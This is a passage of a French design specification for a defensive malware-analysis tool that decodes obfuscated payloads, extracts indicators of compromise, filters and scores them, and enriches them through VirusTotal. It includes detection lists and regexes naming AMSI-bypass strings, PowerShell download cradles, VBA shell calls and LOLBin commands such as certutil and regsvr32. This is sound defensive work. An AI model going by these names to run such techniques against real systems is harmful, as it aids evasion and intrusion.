    1. PS_ENCODED_CMD_RE → extraire payload → base64.b64decode → UTF-16LE decode
    2. B64_STANDARD_RE → base64.b64decode(match.group())
    3. B64_URLSAFE_RE → base64.urlsafe_b64decode(match.group())
    Si le résultat décodé contient encore du B64 → appel récursif (depth < MAX_RECURSION)
    Si résultat commence par magic bytes connu (MZ=b'MZ', ZIP=b'PK') → retourner bytes
    Sinon → retourner str UTF-8 (erreurs ignorées)
    layers_found = profondeur de récursion atteinte
    confidence = 0.9 si décodage clean, 0.6 si partiel
    """

──────────────────────────────────────────────────────────────────────────────
deobfuscators/xor_decoder.py
──────────────────────────────────────────────────────────────────────────────

HIGH_ENTROPY_MIN: ClassVar[float] = 5.5
HIGH_ENTROPY_MAX: ClassVar[float] = 7.8
MIN_DATA_SIZE: ClassVar[int] = 32
ASCII_RATIO_THRESHOLD: ClassVar[float] = 0.40
MIN_SCORE_THRESHOLD: ClassVar[float] = 0.35
KNOWN_STRINGS: ClassVar[list[bytes]] = [
    b"MZ", b"http", b"cmd", b"powershell", b"This program",
    b"HKEY_", b"kernel32", b"CreateProcess", b"socket", b"connect",
]

def detect(self, data: bytes | str) -> bool:
    """
    Convertir en bytes si str.
    Entropie dans [HIGH_ENTROPY_MIN, HIGH_ENTROPY_MAX] ET len > MIN_DATA_SIZE.
    """

def decode(self, data: bytes | str) -> tuple[bytes, DeobfuscationResult]:
    """
    1. _brute_force_single_byte(data) → liste (key, decoded, score) triée par score desc
    2. Si meilleur score < MIN_SCORE_THRESHOLD → tenter _brute_force_4byte(data)
    3. Si toujours < MIN_SCORE_THRESHOLD → lève DeobfuscationError
    4. Retourner (decoded, DeobfuscationResult avec key_used=hex(key))
    """

def _score_candidate(self, decoded: bytes, key: bytes) -> float:
    """
    ascii_ratio = len([b for b in decoded if 0x20 <= b <= 0x7E]) / len(decoded)
    string_bonus = 0.30 si un KNOWN_STRINGS est trouvé dans decoded
    entropy_bonus = 0.20 si entropie(decoded) < 5.0
    Retourner min(1.0, ascii_ratio * 0.5 + string_bonus + entropy_bonus)
    """

def _brute_force_single_byte(
    self, data: bytes
) -> list[tuple[bytes, bytes, float]]:
    """
    Pour key in range(1, 256) :
        decoded = bytes(b ^ key for b in data)
        score = _score_candidate(decoded, bytes([key]))
    Retourner sorted(results, key=lambda x: x[2], reverse=True)[:5]
    """

def _brute_force_4byte(
    self, data: bytes
) -> list[tuple[bytes, bytes, float]]:
    """
    Chercher pattern de répétition dans les 64 premiers bytes.
    Tester les clés 4-byte les plus probables (variations du byte dominant).
    Retourner top 3 candidats.
    """

def _calculate_entropy(self, data: bytes) -> float:
    """Shannon : -sum(p * log2(p) for p in freq if p > 0)"""

──────────────────────────────────────────────────────────────────────────────
deobfuscators/rot_decoder.py
──────────────────────────────────────────────────────────────────────────────

MIN_PRINTABLE_RATIO: ClassVar[float] = 0.75
MIN_TEXT_LENGTH: ClassVar[int] = 20

def detect(self, data: bytes | str) -> bool:
    """True si données assez longues et apparemment texte (ratio imprimable > 0.5)."""

def decode(self, data: bytes | str) -> tuple[str, DeobfuscationResult]:
    """
    Pour rotation in range(1, 26) :
        decoded = _rot_n(text, rotation)
        score = _score_rot(decoded)
    Retourner le meilleur si score > MIN_PRINTABLE_RATIO.
    Sinon lève DeobfuscationError.
    key_used = f"ROT{best_rotation}"
    """

def _rot_n(self, text: str, n: int) -> str:
    """Rotation Caesar pour lettres uniquement, préserve les autres caractères."""

def _score_rot(self, text: str) -> float:
    """
    ratio_alpha = count(c.isalpha() for c in text) / len(text)
    # ROT correct → plus de lettres alphabétiques en proportion
    Retourner ratio_alpha
    """

──────────────────────────────────────────────────────────────────────────────
deobfuscators/powershell_decoder.py
──────────────────────────────────────────────────────────────────────────────

AMSI_BYPASS_PATTERNS: ClassVar[list[str]] = [
    "amsiInitFailed", "amsiContext", "[Ref].Assembly.GetType",
    "System.Management.Automation.AmsiUtils",
    "amsiSession", "AmsiScanBuffer",
]
INVOKE_EXPR_PATTERNS: ClassVar[list[str]] = [
    "Invoke-Expression", "IEX", "& (", "& {",
]
DOWNLOAD_PATTERNS: ClassVar[list[str]] = [
    "DownloadString", "DownloadFile", "WebClient", "Invoke-WebRequest",
    "Net.WebClient", "System.Net.Http.HttpClient",
]

def detect(self, data: bytes | str) -> bool:
    """True si -EncodedCommand ou AMSI_BYPASS_PATTERNS ou INVOKE_EXPR_PATTERNS trouvé."""

def decode(self, data: bytes | str) -> tuple[str, DeobfuscationResult]:
    """
    1. Chercher -EncodedCommand → base64 UTF-16LE decode
    2. Tagger "amsi_bypass" si AMSI_BYPASS_PATTERNS trouvé
    3. Tagger "download_cradle" si DOWNLOAD_PATTERNS trouvé
    4. Retourner code PS1 décodé + tags dans DeobfuscationResult
    """

──────────────────────────────────────────────────────────────────────────────
deobfuscators/packer_detector.py
──────────────────────────────────────────────────────────────────────────────

Ce module ne fait pas d'unpacking réel.
Il enrichit les métadonnées du fichier (is_packed, packer_name).

Note : la logique principale est dans pe_parser.py (_detect_packer).
packer_detector.py est un désobfuscateur adapateur qui délègue à PEParser
et expose l'interface BaseDeobfuscator pour l'intégration dans la chaîne.

def detect(self, data: bytes | str) -> bool:
    """True si données PE valides (magic MZ) avec taille > 1024."""

def decode(self, data: bytes | str) -> tuple[bytes, DeobfuscationResult]:
    """
    Appeler pe_parser._detect_packer(data).
    Retourner (data inchangée, DeobfuscationResult avec method=packer_name).
    confidence = 0.9 si packer confirmé, 0.0 si non packé.
    """

════════════════════════════════════════════════════════════════════════════════
SECTION 7 — EXTRACTEURS (extractors/)
════════════════════════════════════════════════════════════════════════════════

──────────────────────────────────────────────────────────────────────────────
extractors/base.py
──────────────────────────────────────────────────────────────────────────────

class BaseExtractor(ABC):
    """
    Interface commune. Chaque extracteur produit des RawIOC.
    Les extracteurs ne filtrent pas et ne scorent pas.
    """

    @abstractmethod
    def can_handle(self, file_bytes: bytes, file_path: Path) -> bool: ...

    @abstractmethod
    def extract(
        self,
        file_bytes: bytes,
        file_path: Path,
        metadata: FileMetadata,
    ) -> list[RawIOC]:
        """
        Extrait les IOCs bruts.
        Erreur non-bloquante → log WARNING + retourner liste partielle.
        Erreur bloquante → lève ExtractionError.
        """
        ...

    @property
    @abstractmethod
    def extraction_method(self) -> str:
        """Identifiant : 'pe_imports'|'regex_text'|'vba_macro'|'binary_strings'"""
        ...

    def _extract_context(
        self, text: str, start: int, end: int, window: int = 64
    ) -> str:
        """
        Retourner text[max(0, start-window):min(len(text), end+window)].
        Utilisé par tous les extracteurs pour remplir context_snippet.
        """

──────────────────────────────────────────────────────────────────────────────
extractors/regex_extractor.py — Port COMPLET des patterns
──────────────────────────────────────────────────────────────────────────────

Ce fichier est CRITIQUE. Il contient l'ensemble des patterns regex et des
données de référence qui constituent le cœur de l'extraction textuelle.

Porter EXACTEMENT et COMPLÈTEMENT depuis le code existant :
  - TOUS les patterns regex (IPv4, IPv6, domaine, URL, email, MD5, SHA1,
    SHA256, SSDEEP, IMPHASH, filepath Windows, filepath Unix, registry key,
    mutex, commandes PowerShell, cmd.exe, certutil, bitsadmin, regsvr32,
    mshta, wmic, wget, curl, base64 EncodedCommand)
  - valid_tlds : ensemble complet des TLDs valides (> 1500 entrées)
  - benign_domains : ensemble complet des domaines bénins (microsoft.com,
    github.com, google.com, etc.)
  - system_module_patterns : liste complète des patterns de modules système
    (Python stdlib, bibliothèques C runtime, Java packages, .NET namespaces)
  - binary_section_patterns : patterns de noms de sections PE/ELF
    qui sont des faux positifs (noms de compilateurs, bibliothèques)
  - file_extensions : extensions de fichiers légitimes à filtrer des domaines

Méthodes à implémenter :

def can_handle(self, file_bytes, file_path) -> bool:
    """
    True si le contenu est décodable en texte (UTF-8 ou Latin-1).
    Tenter file_bytes.decode('utf-8') puis fallback Latin-1.
    """

def extract(self, file_bytes, file_path, metadata) -> list[RawIOC]:
    """
    1. Décoder file_bytes en str (UTF-8 avec fallback Latin-1)
    2. Appliquer refanging automatique si IOCDefanger.contains_defanged(text)
    3. Appliquer chaque pattern regex (voir liste ci-dessous)
    4. Pour chaque match :
       - Construire RawIOC avec context_snippet (64 chars autour)
       - source_offset = match.start()
       - extraction_method = "regex_text"
    5. Retourner liste de RawIOC (sans filtrer — le filtrage est dans filters/)
    """

def _apply_regex_pattern(
    self, text: str, pattern: re.Pattern, ioc_type: IOCType
) -> list[RawIOC]:
    """Applique un pattern, retourne les RawIOC avec context_snippet."""

def _filter_domains_inline(self, domains: list[str]) -> list[str]:
    """
    Pré-filtrage léger interne à l'extracteur (TLD validation uniquement).
    Le filtrage complet est dans filters/whitelist.py.
    """

PATTERNS À IMPLÉMENTER (compiler avec re.compile, flags appropriés) :

IPV4_RE : IPv4 stricte avec lookahead/lookbehind pour éviter les IP dans URL
    r'(?<!\d)(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)(?!\d)'

IPV6_RE : IPv6 complète et abrégée
    r'(?:[0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|...'  # Pattern complet

DOMAIN_RE : FQDN avec TLD validation (utiliser valid_tlds)
    r'(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}'

URL_RE : URLs HTTP/HTTPS/FTP avec path optionnel
    r'https?://[^\s\'"<>{}\[\]|\\^`\x00-\x1f\x7f-\xff]+'
    + r'ftp://[^\s\'"]+'

EMAIL_RE :
    r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}'

FILEPATH_WIN_RE : Chemins Windows (C:\..., %APPDATA%\...)
    r'(?:[A-Za-z]:\\|\\\\)[^\n\r\'"<>|*?\x00-\x1f]+'
    r'|%(?:APPDATA|TEMP|SYSTEMROOT|WINDIR|PROGRAMFILES|LOCALAPPDATA)%\\[^\s\'"]+'

FILEPATH_UNIX_RE : Chemins Unix absolus
    r'/(?:tmp|etc|usr|var|home|root|bin|sbin|proc|sys)/[^\s\'"<>|*?\x00-\x1f]+'

MD5_RE :
    r'\b[0-9a-fA-F]{32}\b'

SHA1_RE :
    r'\b[0-9a-fA-F]{40}\b'

SHA256_RE :
    r'\b[0-9a-fA-F]{64}\b'

SSDEEP_RE : Format ssdeep : blocksize:hash1:hash2,filename
    r'\d+:[A-Za-z0-9/+]{6,}:[A-Za-z0-9/+]{6,}'

IMPHASH_RE : Identique MD5 mais contextualisé par le mot "imphash" avant/après
    r'(?i)imphash[:\s=]+([0-9a-fA-F]{32})'

REGISTRY_RE :
    r'HKEY_(?:LOCAL_MACHINE|CURRENT_USER|CLASSES_ROOT|USERS|CURRENT_CONFIG)\\'
    r'[^\n\r\'"<>|*?\x00-\x1f]+'
    r'|HKLM\\[^\n\r\'"<>|*?\x00-\x1f]+'
    r'|HKCU\\[^\n\r\'"<>|*?\x00-\x1f]+'

MUTEX_RE : Noms de mutex suspects
    r'(?:Global\\|Local\\)?[A-Za-z0-9_\-\.]{8,64}(?:Mutex|Lock|Sync|Guard)'

POWERSHELL_ENCODED_RE :
    r'-[eE](?:ncoded[cC]ommand)?\s+([A-Za-z0-9+/=]{20,})'

CERTUTIL_RE :
    r'certutil\s+.*?-(?:decode|encode|urlcache|f)\s+[^\s\'"]+'

BITSADMIN_RE :
    r'bitsadmin\s+.*?(?:/transfer|/create|/addfile)\s+[^\s\'"]+'

REGSVR32_RE :
    r'regsvr32\s+(?:/s\s+)?(?:/i:)?(?:http|ftp|\\\\)[^\s\'"]+'

──────────────────────────────────────────────────────────────────────────────
extractors/pe_extractor.py — IOCs depuis la structure PE
──────────────────────────────────────────────────────────────────────────────

Ce fichier extrait des IOCs depuis les données structurées PE (imports, exports,
overlay, resources, version info). Il délègue le parsing à pe_parser.py.

def can_handle(self, file_bytes, file_path) -> bool:
    return file_bytes[:2] == b'MZ'

def extract(self, file_bytes, file_path, metadata) -> list[RawIOC]:
    """
    Si metadata.pe_info is None : retourner []
    Sources d'IOCs PE :
    1. imports : noms de DLL et fonctions → IOCType.FILENAME (DLL) et
       contexte pour regex_extractor
    2. exports : noms de fonctions exportées → IOCType.FILENAME
    3. resources : chaînes extraites via pe_parser._extract_resources()
       → passer à regex_extractor._apply_regex_pattern()
    4. version_info : chaînes via pe_parser._extract_version_info()
       → passer à regex_extractor pour URLs/domaines
    5. section_strings : strings ASCII/Unicode par section via StringExtractor
       → section_name renseigné dans RawIOC
    6. overlay : si pe_parser._extract_overlay() retourne des bytes
       → passer à StringExtractor + regex_extractor
       → extraction_method = "pe_overlay"
    Chaque RawIOC a section_name et extraction_method appropriés.
    """

──────────────────────────────────────────────────────────────────────────────
extractors/elf_extractor.py
──────────────────────────────────────────────────────────────────────────────

def can_handle(self, file_bytes, file_path) -> bool:
    return file_bytes[:4] == b'\x7fELF'

def extract(self, file_bytes, file_path, metadata) -> list[RawIOC]:
    """
    1. Extraire strings ASCII/Unicode depuis sections .rodata, .data via StringExtractor
    2. Passer chaque string à regex_extractor pour extraction IOCs
    3. Extraire noms de symboles (fonctions importées/exportées)
    4. extraction_method = "elf_strings" ou "elf_symbols"
    """

──────────────────────────────────────────────────────────────────────────────
extractors/vba_extractor.py
──────────────────────────────────────────────────────────────────────────────

AUTOEXEC_PATTERNS: ClassVar[list[str]] = [
    "AutoOpen", "AutoClose", "AutoExec", "AutoNew", "Auto_Open",
    "Document_Open", "Document_Close", "Workbook_Open", "Workbook_BeforeClose",
]

SHELL_PATTERNS: ClassVar[list[str]] = [
    "Shell(", "WScript.Shell", "CreateObject", "PowerShell",
    "mshta", "regsvr32", "certutil", "bitsadmin", "rundll32",
    "msiexec", "wmic", "cscript", "wscript",
]

VBA_OBFUSCATION_INDICATORS: ClassVar[dict[str, re.Pattern]] = {
    "chr_encoding":   re.compile(r'Chr\(\d+\)', re.IGNORECASE),
    "string_concat":  re.compile(r'" & "'),
    "base64_decode":  re.compile(r'FromBase64String|DecodeBase64', re.IGNORECASE),
    "hex_encoding":   re.compile(r'Val\("&H'),
    "late_binding":   re.compile(r'CreateObject\([^"\']+\)', re.IGNORECASE),
}

def can_handle(self, file_bytes, file_path) -> bool:
    """True si le fichier est un document Office (déléguer à OfficeParser)."""

def extract(self, file_bytes, file_path, metadata) -> list[RawIOC]:
    """
    1. Récupérer modules VBA depuis office_parser.get_vba_modules()
    2. Pour chaque module :
       a. Détecter AUTOEXEC_PATTERNS → tag "vba_autoexec"
       b. Détecter SHELL_PATTERNS → tag "vba_shell"
       c. Détecter VBA_OBFUSCATION_INDICATORS → liste des techniques
          (stocker dans tags de chaque IOC issu de ce module)
       d. Appliquer regex_extractor sur le code VBA brut
          → extraction_method = "vba_macro"
    3. Retourner tous les RawIOC avec tags appropriés
    """

def _detect_obfuscation_techniques(self, vba_code: str) -> list[str]:
    """Retourne noms des techniques détectées dans VBA_OBFUSCATION_INDICATORS."""

──────────────────────────────────────────────────────────────────────────────
extractors/string_extractor.py
──────────────────────────────────────────────────────────────────────────────

MIN_STRING_LENGTH: ClassVar[int] = 6
PRINTABLE_ASCII: ClassVar[frozenset] = frozenset(
    bytes(range(0x20, 0x7F)) + b'\t\n\r'
)

def can_handle(self, file_bytes, file_path) -> bool:
    """True pour tout fichier binaire (pas de can_handle restrictif)."""

def extract(self, file_bytes, file_path, metadata) -> list[RawIOC]:
    """
    Extraire puis passer à regex_extractor :
    1. ASCII strings : séquences ≥ MIN_STRING_LENGTH bytes dans PRINTABLE_ASCII
    2. Unicode strings (UTF-16LE) : séquences ≥ MIN_STRING_LENGTH wchars
       Pattern : b'\x00'.join(c.encode() for c in printable_chars)
    Chaque string : conserver source_offset pour RawIOC.
    Passer les strings extraites à regex_extractor._apply_regex_pattern().
    extraction_method = "binary_strings"
    """

def extract_from_section(
    self,
    section_data: bytes,
    section_name: str,
    base_offset: int = 0,
) -> list[str]:
    """
    Extrait les strings d'une section PE spécifique.
    Retourne liste de strings (sans créer de RawIOC — déléguer à l'appelant).
    """

════════════════════════════════════════════════════════════════════════════════
SECTION 8 — FILTRES (filters/)
════════════════════════════════════════════════════════════════════════════════

──────────────────────────────────────────────────────────────────────────────
filters/whitelist.py — Port COMPLET et EXHAUSTIF
──────────────────────────────────────────────────────────────────────────────

CRITIQUE : Porter EXACTEMENT et INTÉGRALEMENT depuis le code existant
(extracteur.py) les données suivantes. Chaque liste et ensemble doit être
complet — aucune troncature n'est acceptable.

class FilteredIOC(BaseModel):
    raw_ioc: RawIOC
    filter_reason: str    # "RFC1918_IP" | "BENIGN_DOMAIN" | "SYSTEM_MODULE" | ...
    filter_layer: str     # "whitelist" | "tld_invalid" | "binary_section"

class WhitelistFilter:

    RFC1918_NETWORKS: ClassVar[list] = [
        ipaddress.ip_network("10.0.0.0/8"),
        ipaddress.ip_network("172.16.0.0/12"),
        ipaddress.ip_network("192.168.0.0/16"),
        ipaddress.ip_network("127.0.0.0/8"),
        ipaddress.ip_network("169.254.0.0/16"),
        ipaddress.ip_network("224.0.0.0/4"),
        ipaddress.ip_network("240.0.0.0/4"),
        ipaddress.ip_network("::1/128"),
        ipaddress.ip_network("fe80::/10"),
        ipaddress.ip_network("fc00::/7"),
    ]

    # Porter EXACTEMENT depuis extracteur.py :
    BENIGN_DOMAINS: ClassVar[set[str]]           # benign_domains complet
    VALID_TLDS: ClassVar[set[str]]               # valid_tlds complet
    SYSTEM_MODULE_PATTERNS: ClassVar[list[str]]  # system_module_patterns complet
    BINARY_SECTION_PATTERNS: ClassVar[list[str]] # binary_section_patterns complet
    FILE_EXTENSIONS: ClassVar[set[str]]          # file_extensions complet

    CDN_DOMAINS: ClassVar[set[str]] = {
        "cloudflare.com", "cloudflare.net", "akamai.net", "akamaiedge.net",
        "fastly.net", "cloudfront.net", "jsdelivr.net", "bootstrapcdn.com",
        "cdnjs.cloudflare.com", "unpkg.com", "stackpath.com",
    }

    INTERNAL_TLDS: ClassVar[set[str]] = {
        "local", "internal", "corp", "lan", "home", "intranet", "localdomain",
    }

    def filter(
        self,
        iocs: list[RawIOC],
    ) -> tuple[list[RawIOC], list[FilteredIOC]]:
        """
        Retourne (conservés, rejetés_avec_raison).
        Logguer chaque rejet en DEBUG avec logger.debug().
        """

    def is_rfc1918(self, ip: str) -> bool:
        """
        try: ipaddress.ip_address(ip)
        Vérifier contre RFC1918_NETWORKS.
        except ValueError: return False
        """

    def is_benign_domain(self, domain: str) -> bool:
        """
        Vérifier domain.lower() dans BENIGN_DOMAINS.
        Vérifier le eTLD+1 extrait manuellement (splitter sur '.').
        """

    def is_valid_tld(self, domain: str) -> bool:
        """Extraire TLD = domain.rsplit('.', 1)[-1].lower()"""

    def is_system_module(self, value: str) -> bool:
        """re.match sur chaque pattern de SYSTEM_MODULE_PATTERNS."""

    def is_cdn_domain(self, domain: str) -> bool:
        """Vérifier contre CDN_DOMAINS."""

    def is_internal_tld(self, domain: str) -> bool:
        """TLD dans INTERNAL_TLDS."""

──────────────────────────────────────────────────────────────────────────────
filters/defanger.py
──────────────────────────────────────────────────────────────────────────────

class IOCDefanger:

    DEFANGED_PATTERNS: ClassVar[dict[str, str]] = {
        "hxxps[://]": "https://",
        "hxxp[://]":  "http://",
        "hxxps://":   "https://",
        "hxxp://":    "http://",
        "[.]":        ".",
        "[dot]":      ".",
        "(.)":        ".",
        "[@]":        "@",
        "[at]":       "@",
        "[:]":        ":",
        "[//]":       "//",
    }

    DEFANG_RULES: ClassVar[dict[IOCType, list[tuple[str, str]]]] = {
        IOCType.URL: [
            ("https://", "hxxps[://]"),
            ("http://",  "hxxp[://]"),
            ("ftp://",   "fxp[://]"),
            (".",        "[.]"),
        ],
        IOCType.IPV4: [(".", "[.]")],
        IOCType.IPV6: [(":", "[:]")],
        IOCType.DOMAIN: [(".", "[.]")],
        IOCType.EMAIL:  [("@", "[@]"), (".", "[.]")],
    }

    def defang(self, value: str, ioc_type: IOCType) -> str:
        """
        Appliquer DEFANG_RULES[ioc_type] si défini.
        Si ioc_type pas dans DEFANG_RULES : retourner value inchangée.
        """

    def refang(self, value: str) -> str:
        """Inverser toutes les transformations de DEFANGED_PATTERNS."""

    def refang_text(self, text: str) -> str:
        """
        Remplacer toutes les occurrences des patterns de DEFANGED_PATTERNS
        dans un texte long. Retourner le texte avec IOCs refangés.
        """

    def contains_defanged(self, text: str) -> bool:
        """True si le texte contient un pattern de DEFANGED_PATTERNS."""

──────────────────────────────────────────────────────────────────────────────
filters/deduplicator.py
──────────────────────────────────────────────────────────────────────────────

class IOCDeduplicator:

    def normalize(self, value: str, ioc_type: IOCType) -> str:
        """
        IPV4/IPV6  : str(ipaddress.ip_address(value)) ou value.lower()
        DOMAIN     : value.lower().rstrip(".")
        URL        : urllib.parse.urlnormalize (lowercase scheme+host, sort params)
        EMAIL      : value.lower().strip()
        HASH_*     : value.lower().strip()
        FILEPATH   : value.replace("\\", "/").lower()
        REGISTRY_KEY : value.upper()  (convention Windows)
        Autres     : value.strip()
        """

    def deduplicate(self, iocs: list[RawIOC]) -> list[RawIOC]:
        """
        Clé de déduplication : (ioc.type, normalize(ioc.value)).
        En cas de doublon : conserver le RawIOC avec context_snippet
        le plus long (plus informatif).
        Retourner list(seen.values()).
        """

════════════════════════════════════════════════════════════════════════════════
SECTION 9 — HEURISTIQUES (heuristics/)
════════════════════════════════════════════════════════════════════════════════

──────────────────────────────────────────────────────────────────────────────
heuristics/entropy.py
──────────────────────────────────────────────────────────────────────────────

import math
from collections import Counter

class EntropyCalculator:
    """Calcul d'entropie Shannon. Aucune dépendance externe."""

    @staticmethod
    def calculate(data: bytes) -> float:
        """
        Entropie globale 0.0-8.0.
        Si len(data) == 0 : retourner 0.0
        freq = Counter(data)
        return -sum((c/n) * math.log2(c/n) for c in freq.values())
        """

    @staticmethod
    def calculate_windowed(data: bytes, window_size: int = 256) -> list[float]:
        """
        Entropie glissante par fenêtres non-chevauchantes de window_size bytes.
        Retourner liste d'entropies (len = len(data) // window_size).
        """

    @staticmethod
    def classify(entropy: float) -> str:
        """
        < 1.0   → "binary_zeros"
        1.0-3.9 → "plaintext"
        4.0-5.9 → "compressed_or_encoded"
        6.0-6.9 → "mixed"
        7.0-7.5 → "likely_encrypted"
        > 7.5   → "encrypted_or_random"
        """

    @staticmethod
    def find_high_entropy_regions(
        data: bytes,
        threshold: float = 7.0,
        window_size: int = 256,
    ) -> list[tuple[int, int]]:
        """
        Retourner liste de (offset_start, offset_end) des zones > threshold.
        Fusionner les fenêtres adjacentes en une seule région.
        """

──────────────────────────────────────────────────────────────────────────────
heuristics/context_analyzer.py
──────────────────────────────────────────────────────────────────────────────

from dataclasses import dataclass, field

@dataclass
class ExtractionContext:
    """
    Contexte global partagé entre tous les composants du pipeline.
    Construit progressivement par AnalysisPipeline au fil des stages.
    """
    pe_imports: dict[str, list[str]] = field(default_factory=dict)
    suspicious_imports: list[str] = field(default_factory=list)
    import_suspicion_score: int = 0
    is_packed: bool = False
    packer_name: str | None = None
    high_entropy_regions: list[tuple[int, int]] = field(default_factory=list)
    deobfuscation_layers: list[DeobfuscationResult] = field(default_factory=list)
    vba_autoexec_detected: bool = False
    vba_shell_detected: bool = False
    vba_obfuscation_techniques: list[str] = field(default_factory=list)
    archive_extraction_paths: list[str] = field(default_factory=list)

class ContextAnalyzer:

    @staticmethod
    def build_from_metadata(metadata: FileMetadata) -> ExtractionContext:
        """Initialiser ExtractionContext depuis les métadonnées du fichier."""

    @staticmethod
    def is_in_high_entropy_region(
        offset: int, regions: list[tuple[int, int]]
    ) -> bool:
        """True si offset est dans une des régions haute entropie."""

    @staticmethod
    def has_injection_combo(imports: dict[str, list[str]]) -> bool:
        """
        Vérifier si les imports contiennent un combo d'injection complet.
        Utiliser les INJECTION_COMBOS définis dans pe_parser.py.
        """

──────────────────────────────────────────────────────────────────────────────
heuristics/ioc_scorer.py — Système de scoring complet
──────────────────────────────────────────────────────────────────────────────

BASE_SCORE: ClassVar[int] = 30

SUSPECT_TLDS: ClassVar[set[str]] = {
    "tk", "pw", "xyz", "top", "cc", "gq", "cf", "ml", "ga", "to",
    "click", "link", "online", "site", "website", "fun", "icu",
}

CDN_DOMAINS: ClassVar[set[str]] = {
    "cloudflare.com", "cloudflare.net", "akamai.net", "fastly.net",
    "cloudfront.net", "jsdelivr.net", "bootstrapcdn.com",
}

ANTIDEBUG_STRINGS: ClassVar[list[str]] = [
    "IsDebuggerPresent", "CheckRemoteDebugger", "anti-vm", "vmware",
    "virtualbox", "sandboxie", "wine", "NtQueryInformationProcess",
]

class IOCScorer:
    """
    Moteur de scoring 0-100 purement algorithmique, sans IA.

    RÈGLES DE BONUS (chaque bonus appliqué est documenté dans scoring_reasons) :
    +20 : raw_ioc.in_decoded_layer == True
    +15 : section_name in {'\.text', '\.code', 'CODE', '.textbss'}
    +15 : extraction_method == "vba_macro" ET context.vba_autoexec_detected
    +12 : type in {IPV4, IPV6, DOMAIN, URL} ET offset dans high_entropy_region
    +10 : context.has_injection_combo() == True
    +10 : extraction_method == "pe_overlay"
    +08 : type == URL ET query params contiennent Base64 (B64_URLSAFE_RE match)
    +05 : type == DOMAIN ET TLD dans SUSPECT_TLDS
    +05 : type == IPV4 ET NOT RFC1918 ET NOT CDN ET NOT loopback

    RÈGLES DE MALUS :
    -30 : value.lower() dans BENIGN_DOMAINS
    -20 : type == IPV4 ET RFC1918 ou loopback ou multicast
    -15 : is_system_module(value) == True
    -10 : domain dans CDN_DOMAINS
    -05 : "version" ou "copyright" dans context_snippet.lower()
    -05 : type == URL ET domain in BENIGN_DOMAINS

    Score = max(0, min(100, BASE_SCORE + sum(bonus) + sum(malus)))
    """

    def score(
        self,
        raw_ioc: RawIOC,
        context: ExtractionContext,
    ) -> tuple[int, list[str]]:
        """
        Retourne (score_final_0_100, liste_raisons_auditables).
        Chaque règle appliquée ajoute une entrée lisible à la liste.
        Ex: "+20: IOC found in decoded XOR layer", "-20: RFC1918 address"
        """

    def score_batch(
        self,
        raw_iocs: list[RawIOC],
        context: ExtractionContext,
    ) -> list[tuple[int, list[str]]]:
        """Applique score() sur chaque IOC, retourne dans le même ordre."""

    def to_confidence_level(self, score: int) -> IOCConfidenceLevel:
        """
        80-100 → CONFIRMED
        60-79  → HIGH
        40-59  → MEDIUM
        20-39  → LOW
        0-19   → NOISE
        """

    def _extract_tld(self, domain: str) -> str:
        """domain.rsplit('.', 1)[-1].lower()"""

    def _has_base64_in_url_params(self, url: str) -> bool:
        """
        urllib.parse.urlparse(url) → query_string.
        Chercher B64_STANDARD_RE dans les valeurs des params.
        """

════════════════════════════════════════════════════════════════════════════════
SECTION 10 — ENRICHISSEUR VIRUSTOTAL (enrichers/)
════════════════════════════════════════════════════════════════════════════════

──────────────────────────────────────────────────────────────────────────────
enrichers/virustotal.py — Async httpx + rate limiting + cache
──────────────────────────────────────────────────────────────────────────────

Import : httpx, asyncio, tenacity, base64, hashlib, time

VT_BASE_URL: ClassVar[str] = "https://www.virustotal.com/api/v3"

MALICIOUS_THRESHOLD: ClassVar[int] = 5      # malicious >= 5 → MALVEILLANT
SUSPICIOUS_THRESHOLD: ClassVar[int] = 1     # malicious >= 1 → SUSPECT

ENRICHABLE_TYPES: ClassVar[set[IOCType]] = {
    IOCType.HASH_MD5, IOCType.HASH_SHA256,
    IOCType.IPV4, IOCType.IPV6,
    IOCType.DOMAIN, IOCType.URL,
}

class AsyncVTEnricher(BaseEnricher):

    def __init__(self, api_key: str, is_premium: bool = False):
        self._api_key = api_key
        self._semaphore = asyncio.Semaphore(50 if is_premium else 4)
        self._cache: dict[str, VTResult] = {}      # clé = sha256(type+value)
        self._cache_timestamps: dict[str, float] = {}
        self._client: httpx.AsyncClient | None = None

    async def __aenter__(self) -> "AsyncVTEnricher":
        self._client = httpx.AsyncClient(
            headers={"x-apikey": self._api_key},
            timeout=httpx.Timeout(10.0),
            http2=True,
        )
        return self

    async def __aexit__(self, *args) -> None:
        if self._client:
            await self._client.aclose()

    async def enrich_bundle(
        self,
        bundle: IOCBundle,
        max_per_type: int = 5,
    ) -> IOCBundle:
        """
        Enrichir les IOCs de types dans ENRICHABLE_TYPES.
        Limiter à max_per_type par IOCType.
        Traitement parallèle avec asyncio.gather (semaphore intégré).
        Retourner nouveau IOCBundle avec vt_result renseignés.
        En cas de VTRateLimitError ou VTAPIKeyError :
        logguer ERROR et retourner bundle inchangé.
        """

    async def _check_ioc(self, ioc: IOC) -> VTResult:
        """
        Vérifier cache d'abord (TTL = settings.VT_CACHE_TTL_HOURS).
        Router vers _check_hash / _check_ip / _check_domain / _check_url.
        Stocker résultat dans cache.
        """

    async def _check_hash(self, value: str) -> VTResult:
        """GET /files/{hash}"""

    async def _check_ip(self, value: str) -> VTResult:
        """GET /ip_addresses/{ip}"""

    async def _check_domain(self, value: str) -> VTResult:
        """GET /domains/{domain}"""

    async def _check_url(self, value: str) -> VTResult:
        """GET /urls/{base64_url} où base64_url = base64.urlsafe_b64encode(url).rstrip(b'=')"""

    @tenacity.retry(
        stop=tenacity.stop_after_attempt(3),
        wait=tenacity.wait_exponential(multiplier=1, min=2, max=30),
        retry=tenacity.retry_if_exception_type(VTRateLimitError),
        reraise=True,
    )
    async def _request(self, url: str) -> dict | None:
        """
        async with self._semaphore:
            response = await self._client.get(url)
        200 → return response.json()
        404 → return None (inconnu chez VT)
        429 → raise VTRateLimitError
        401 → raise VTAPIKeyError
        Autre → log WARNING, return None
        """

    def _calc_confidence(self, stats: dict) -> tuple[int, str]:
        """
        malicious = stats.get('malicious', 0)
        suspicious = stats.get('suspicious', 0)
        total = sum(stats.values())
        if total == 0: return (0, "INCONNU")
        score = min(100, int((malicious * 100 + suspicious * 50) / total))
